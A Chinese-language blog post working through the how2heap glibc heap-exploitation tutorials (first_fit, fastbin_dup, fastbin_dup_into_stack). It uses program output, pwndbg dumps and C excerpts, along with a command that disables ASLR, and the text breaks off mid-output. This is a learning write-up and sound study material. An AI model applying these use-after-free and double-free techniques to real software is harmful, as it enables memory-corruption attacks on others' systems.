<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="how2heap - 1"><meta name="keywords" content="pwn"><meta name="author" content="QRZ"><meta name="copyright" content="QRZ"><title>how2heap - 1 | QRZ's Blog</title><link rel="shortcut icon" href="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ff97cec996f09596dd444ef4dd5c925d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-131763109-1', 'auto');
ga('send', 'pageview');</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
   var hm = document.createElement("script");
   hm.src = "https://tajs.qq.com/stats?sId=62826431";
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="QRZ's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-1"><span class="toc-text">how2heap - 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#first-fit"><span class="toc-text">first_fit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F"><span class="toc-text">顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-text">fastbin_dup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A"><span class="toc-text">输出：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-text">fastbin_dup_into_stack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F-1"><span class="toc-text">顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-text">fastbin_dup_consolidate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%EF%BC%9A-1"><span class="toc-text">输出：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%EF%BC%9A"><span class="toc-text">顺序：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">解释：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"></div><div class="author-info__name text-center">QRZ</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">QRZ's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" target="_blank" rel="noopener" href="https://wiki.qrzbing.cn">Wiki</a><a class="site-page" href="/about">About</a><a class="site-page" href="/music">Music</a><a class="site-page" href="/friends">Friends</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">how2heap - 1</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="how2heap-1"><a href="#how2heap-1" class="headerlink" title="how2heap - 1"></a>how2heap - 1</h1><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">how2heap</a></p>
<a id="more"></a>

<p>我本地的 glibc 环境是 2.23 (Ubuntu 16.04 LTS)</p>
<p>查看 ASLR:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="comment"># case 0:</span></span><br><span class="line"><span class="comment">#   关闭ASLR</span></span><br><span class="line"><span class="comment"># case 1:</span></span><br><span class="line"><span class="comment">#   mmap base、stack、vdso page将随机化。这意味着.so文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK，randomize_va_space缺省为1。此时heap没有随机化。</span></span><br><span class="line"><span class="comment"># case 2:</span></span><br><span class="line"><span class="comment">#    在1的基础上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，randomize_va_space缺省为2。</span></span><br></pre></td></tr></table></figure>

<p>关闭 ASLR</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<p>开始做的时候没关随机化，所以地址看起来会比较奇怪。</p>
<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.</span><br><span class="line">1st malloc(512): 0x55b640246010</span><br><span class="line">2nd malloc(256): 0x55b640246220</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let&#39;s put a string at a that we can read later &quot;this is A!&quot;</span><br><span class="line">first allocation 0x55b640246010 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don&#39;t need to free anything again. As long as we allocate less than 512, it will end up at 0x55b640246010</span><br><span class="line">So, let&#39;s allocate 500 bytes</span><br><span class="line">3rd malloc(500): 0x55b640246010</span><br><span class="line">And put a different string here, &quot;this is C!&quot;</span><br><span class="line">3rd allocation 0x55b640246010 points to this is C!</span><br><span class="line">first allocation 0x55b640246010 points to this is C!</span><br></pre></td></tr></table></figure>

<h3 id="顺序"><a href="#顺序" class="headerlink" title="顺序"></a>顺序</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; malloc(512)</span><br><span class="line">b &#x3D; malloc(256)</span><br><span class="line">strcpy(a, &quot;this is A!&quot;)</span><br><span class="line">free(a)</span><br><span class="line">c &#x3D; malloc(500)</span><br><span class="line">strcpy(c, &quot;this is C!&quot;)</span><br><span class="line">show(c_addr)</span><br><span class="line">show(a_addr)</span><br></pre></td></tr></table></figure>

<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>首先分配一个 512 大小的块，地址为 0x55b640246010，再分配一个大小为 256 的块，地址为 0x55b640246220。</p>
<p>此时堆状态如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757210 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 273, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x555555757320 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 134369, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后向 A 中写入字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x2073692073696874, </span><br><span class="line">  bk &#x3D; 0x2141, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757000</span><br><span class="line">0x555555757000:	0x0	0x211</span><br><span class="line">0x555555757010:	0x2073692073696874	0x2141</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x555555757010</span><br><span class="line">0x555555757010:	&quot;this is A!&quot;</span><br><span class="line">0x55555575701b:	&quot;&quot;</span><br><span class="line">0x55555575701c:	&quot;&quot;</span><br><span class="line">0x55555575701d:	&quot;&quot;</span><br><span class="line">0x55555575701e:	&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>接下来释放 chunk a。由于 a 的大小为 512，不适于 fastbins，glibc 会将这个 chunk 放入 unsortedbin。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757000</span><br></pre></td></tr></table></figure>

<p>原因：</p>
<ol>
<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
<li>当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。</li>
</ol>
<p>More:</p>
<ol>
<li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li>
<li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li>
</ol>
<p>再申请一个大小为 500 的块，因为这一块和我们之前 free 的那块大小差不多，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。</p>
<p>这里向 C 中写入 <code>&quot;this is C&quot;</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x555555757000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 529, </span><br><span class="line">  fd &#x3D; 0x2073692073696874, </span><br><span class="line">  bk &#x3D; 0x7ffff7002143, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757000</span><br><span class="line">0x555555757000:	0x0	0x211</span><br><span class="line">0x555555757010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x555555757010</span><br><span class="line">0x555555757010:	&quot;this is C!&quot;</span><br><span class="line">0x55555575701b:	&quot;\367\377\177&quot;</span><br><span class="line">0x55555575701f:	&quot;&quot;</span><br><span class="line">0x555555757020:	&quot;&quot;</span><br><span class="line">0x555555757021:	&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>unsortedbin 也被取出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br></pre></td></tr></table></figure>

<p>这时可以发现，C 的位置也是 A 的位置，我们打印 a 的内容也会输出 <code>&quot;this is C&quot;</code>。这是一个明显的 UAF(Use After Free) 漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;a</span><br><span class="line">$2 &#x3D; (char **) 0x7fffffffdc68</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x7fffffffdc68</span><br><span class="line">0x7fffffffdc68:	0x555555757010	0x555555757220</span><br><span class="line">0x7fffffffdc78:	0x555555757010	0x7fffffffdd70</span><br><span class="line">0x7fffffffdc88:	0x0	0x555555554a20 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffdc98:	0x7ffff7a2d830 &lt;__libc_start_main+240&gt;	0x1</span><br><span class="line">0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x55555555475a &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffdcc8:	0xf9f925f8975b0ef5	0x555555554650 &lt;_start&gt;</span><br><span class="line">0x7fffffffdcd8:	0x7fffffffdd70	0x0</span><br><span class="line">0x7fffffffdce8:	0x0	0xacac70adba5b0ef5</span><br><span class="line">0x7fffffffdcf8:	0xacac6017accb0ef5	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x555555757010</span><br><span class="line">0x555555757010:	0x2073692073696874	0x7ffff7002143</span><br><span class="line">0x555555757020:	0x0	0x0</span><br><span class="line">0x555555757030:	0x0	0x0</span><br><span class="line">0x555555757040:	0x0	0x0</span><br><span class="line">0x555555757050:	0x0	0x0</span><br><span class="line">0x555555757060:	0x0	0x0</span><br><span class="line">0x555555757070:	0x0	0x0</span><br><span class="line">0x555555757080:	0x0	0x0</span><br><span class="line">0x555555757090:	0x0	0x0</span><br><span class="line">0x5555557570a0:	0x0	0x0</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$3 &#x3D; 0x555555757010 &quot;this is C!&quot;</span><br></pre></td></tr></table></figure>

<p>UAF 出现的原因：指针 free 之后没有置 0。</p>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>这道题讲了 fastbin 机制下的 double free。</p>
<h3 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x602030.</span><br><span class="line">Now, we can free 0x602010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x602010, 0x602030, 0x602010 ]. If we malloc 3 times, we&#39;ll get 0x602010 twice!</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602010</span><br></pre></td></tr></table></figure>

<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">17</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>: <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span>:</span><br><span class="line"><span class="number">20</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>: <span class="comment">// free(a);</span></span><br><span class="line"><span class="number">22</span>:</span><br><span class="line"><span class="number">23</span>: <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>: <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure>

<p>如果我们首先把第 21 行的注释去掉，会报这样的错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x602010</span><br><span class="line">2nd malloc(8): 0x602030</span><br><span class="line">3rd malloc(8): 0x602050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.</span><br><span class="line">*** Error in &#96;.&#x2F;fastbin_dup&#39;: double free or corruption (fasttop): 0x0000000000602010 ***</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Backtrace: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x777e5)[0x7ffff7a847e5]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x8037a)[0x7ffff7a8d37a]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(cfree+0x4c)[0x7ffff7a9153c]</span><br><span class="line">.&#x2F;fastbin_dup[0x400762]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]</span><br><span class="line">.&#x2F;fastbin_dup[0x400579]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Memory map: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00600000-00601000 r--p 00000000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00601000-00602000 rw-p 00001000 08:01 3546821                            &#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;fastbin_dup</span><br><span class="line">00602000-00623000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 </span><br><span class="line">7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 1837020                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1832518                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1832172                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">[1]    55675 abort (core dumped)  .&#x2F;fastbin_dup</span><br></pre></td></tr></table></figure>
<p>这是一个典型的 double free，因为一个已经 free 掉的 chunk 是不能被 free 第二次的。接下来我们把注释加上，重新编译运行。编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -no-pie -o fastbin_dup.c -o fastbin_dup</span><br></pre></td></tr></table></figure>

<p>首先 malloc 了三个 chunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x20fa1</span><br><span class="line">&#125;</span><br><span class="line">0x602060 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135073, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后 <code>free(a)</code>, <code>free(b)</code>。这时 fastbin 形成了一个 fastbin freelist：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602020 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>其中 <code>chunk A --&gt; chunk B</code>。</p>
<p>接下来再次释放 a，发现这次没发生报错，且形成了如下的 free list：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602000 —▸ 0x602020 ◂— 0x602000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p><code>chunk A --&gt; chunk B &lt;-- chunk A</code></p>
<p>这样就可以绕过 fastbin 的 double free 检查了，原因如下：</p>
<blockquote>
<p>fastbin 可以看作一个 LIFO 的栈，使用单链表实现，通过 <code>fastbin-&gt;fd</code> 遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以在这两次 free 之间增加了一次对其他 chunk 的 free 过程，从而绕过检查。再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p>
</blockquote>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fffffffdca8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x603010</span><br><span class="line">2nd malloc(8): 0x603030</span><br><span class="line">3rd malloc(8): 0x603050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x603010 again, things will crash because 0x603010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x603030.</span><br><span class="line">Now, we can free 0x603010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x603010, 0x603030, 0x603010 